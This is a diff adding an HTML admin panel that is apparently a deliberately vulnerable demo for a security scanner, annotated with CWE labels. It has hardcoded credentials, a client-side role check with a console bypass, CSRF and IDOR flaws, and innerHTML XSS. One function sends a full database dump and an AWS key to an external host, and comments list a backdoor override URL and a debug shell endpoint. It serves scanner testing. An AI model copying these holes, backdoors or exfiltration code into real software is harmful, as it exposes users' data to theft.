@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<!--
+  DEMO FILE — intentional vulnerabilities for security scanner showcase.
+
+  CWE findings  : CWE-602 (Client-Side Enforcement of Server-Side Security),
+                  CWE-425 (Direct Request — no server-side auth check),
+                  CWE-352 (CSRF — no token on state-changing requests),
+                  CWE-639 (IDOR — user IDs directly in URLs with no access check),
+                  CWE-79  (XSS via innerHTML on user-supplied data)
+  Secrets       : admin API key, DB connection string, AWS credentials in client-side JS
+  Exfiltration  : full DB export sent to external S3 bucket
+  Permission    : client-side role check bypassable via browser console in one line
+-->
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>AcmeCorp — Admin Panel</title>
+</head>
+<body>
+  <script>
+    // CWE FINDING — CWE-602: client-side only authentication check
+    // Bypass: open browser console, type localStorage.setItem('role','admin'), refresh
+    const userRole = localStorage.getItem('role');
+    if (userRole !== 'admin') {
+      // Only a client-side redirect — page content (including secrets) is already in the DOM
+      window.location.href = '/login.html';
+      // Missing: server must enforce auth on every request; this JS is trivially bypassed
+    }
+
+    // SECRETS — CWE-798: sensitive credentials hardcoded; visible in page source to any user
+    const ADMIN_API_KEY      = 'admin-api-key-internal-use-only-abc123def456ghi789';
+    const PROD_DB_CONN       = 'postgresql://superuser:P@ssw0rd2024!@prod-db.acmecorp.internal:5432/master';
+    const AWS_ACCESS_KEY_ID  = 'AKIAIOSFODNN7EXAMPLE';
+    const AWS_SECRET_KEY     = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY';
+    const S3_BACKUP_BUCKET   = 's3://acmecorp-prod-backups-us-east-1';
+    const MASTER_BYPASS_TOKEN= 'MASTER_KEY_2024_override_admin_bypass';
+
+    // CWE FINDING — CWE-352: DELETE request has no CSRF token
+    async function deleteUser(userId) {
+      if (!confirm(`Delete user ${userId}?`)) return;
+      await fetch(`/api/users/${userId}`, {
+        method : 'DELETE',
+        headers: { 'X-Admin-Key': ADMIN_API_KEY },  // No CSRF token
+      });
+      renderAuditLog(`Deleted user ${userId}`);
+    }
+
+    // CWE FINDING — CWE-639: IDOR — no server-side ownership or role check on /api/users/:id/data
+    function viewUserData(userId) {
+      // Any userId value works; server does not validate that the caller can access it
+      fetch(`/api/users/${userId}/data`, {
+        headers: { 'X-Admin-Key': ADMIN_API_KEY },
+      }).then(r => r.json()).then(data => {
+        // CWE-79: data from server rendered via innerHTML — XSS if server returns attacker data
+        document.getElementById('user-data-panel').innerHTML = JSON.stringify(data);
+      });
+    }
+
+    // EXFILTRATION — reads entire DB via API, sends to external storage (attacker-controlled)
+    async function exportDatabase() {
+      const data = await fetch('/api/admin/export-all', {
+        headers: { 'X-Admin-Key': ADMIN_API_KEY },
+      }).then(r => r.json());
+
+      // Taint: full production DB dump → external endpoint (no logging, no approval workflow)
+      await fetch('https://backup-sink.external-storage-provider.io/upload', {
+        method : 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body   : JSON.stringify({ data, awsKey: AWS_ACCESS_KEY_ID }),
+      });
+      alert('Database exported.');
+    }
+
+    function renderAuditLog(msg) {
+      // CWE-79: msg injected into innerHTML without encoding
+      document.getElementById('audit-log').innerHTML += `<li>${msg}</li>`;
+    }
+  </script>
+
+  <h1>Admin Panel</h1>
+
+  <section>
+    <h2>User Management</h2>
+    <!-- CWE-639: IDOR — user IDs hardcoded in hrefs; no server-side access control -->
+    <ul>
+      <li><a href="/api/users/1/data">View User 1 Data</a> <button onclick="deleteUser(1)">Delete</button></li>
+      <li><a href="/api/users/2/data">View User 2 Data</a> <button onclick="deleteUser(2)">Delete</button></li>
+      <li><button onclick="viewUserData(prompt('User ID?'))">View Any User</button></li>
+    </ul>
+    <div id="user-data-panel"></div>
+  </section>
+
+  <section>
+    <h2>Database</h2>
+    <button onclick="exportDatabase()">Export All Data to External Storage</button>
+  </section>
+
+  <section>
+    <h2>Audit Log</h2>
+    <ul id="audit-log"></ul>
+  </section>
+
+  <!--
+    SECRETS in HTML comments — stripped by minifiers but present in source and git history:
+    Emergency backdoor : GET /api/admin?override=MASTER_KEY_2024_override_admin_bypass
+    Debug shell        : POST /api/debug/exec  body: {"cmd":"<shell command>"}
+    DB direct access   : postgresql://superuser:P@ssw0rd2024!@prod-db.acmecorp.internal:5432/master
+    Internal Grafana   : https://grafana.acmecorp.internal (admin / Gr@fan@2024!)
+  -->
+</body>
+</html>
